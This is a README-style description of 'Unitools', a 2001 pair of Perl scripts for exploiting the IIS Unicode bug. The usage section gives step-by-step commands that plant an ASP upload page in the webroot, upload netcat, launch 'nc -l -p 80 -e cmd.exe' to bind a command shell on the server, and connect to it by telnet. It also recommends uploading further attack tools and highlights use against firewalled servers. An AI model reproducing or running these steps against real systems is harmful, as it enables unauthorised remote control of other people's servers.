#1. Name
Unitools - for working with IIS servers with the Unicode bug
#2. Author
Roelof Temmingh
#3. License, version & release date
License : GPLv2  
Version : v1.0  
Release Date : 2001/01/24

#4. Description
Unitools.tgz contains two perl scripts - unicodeloader.pl uploads files to a vulnerable IIS site, and unicodexecute3.pl includes searches for more executable directories and is more robust and stable

#4.1 unicodeloader.pl

Works like this - two files (upload.asp and upload.inc - have
it in the same dir as the PERL script) are build in the webroot
(or anywhere else) using echo and some conversion strings.
These files allows you to upload any file by
simply surfing with a browser to the server.
See usage to see how to get a shell.

#4.2 unicodexecute3.pl

- includes searches for alternative executable dirs
- more robust, stable than before
- checks for access denied added
- thnx to MH for testing etc.
#5. Usage
#5.1 Unicode upload creator (unicodeloader.pl)

Typical use: (5 easy steps to a shell)
1. Find the webroot (duh)- let say its f:\the web pages\theroot
2. perl unicodeloader target:80 'f:\the web pages\theroot'
3. surf to target/upload.asp and upload nc.exe
4. perl unicodexecute3.pl target:80 'f:\the web pages\theroot\nc -l -p 80 -e cmd.exe'
5. telnet target 80

Above procedure will drop you into a shell on the box
without crashing the server (*winks at Eeye*).

Of coure you might want to upload other goodies as well
right after nc.exe - fscan.exe seems a good choice :)

This procedure is nice for servers that are very tightly
firewalled; servers that are not allowed to FTP, RCP or TFTP
to the Internet.

Note: kids, please have a *good* look at the code before you use it :-]
More info on Unicode at  
http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806

#5.2 Unicodexecute version3 (unicodexecute3.pl)

Usage is same as previous version:
unicodexecute3.pl target:port 'command'
#6. Requirements
Perl & Vulnerable IIS server
#7. Additional Resources 
http://www.securityfocus.com/vdb/bottom.html?section=exploit&vid=1806
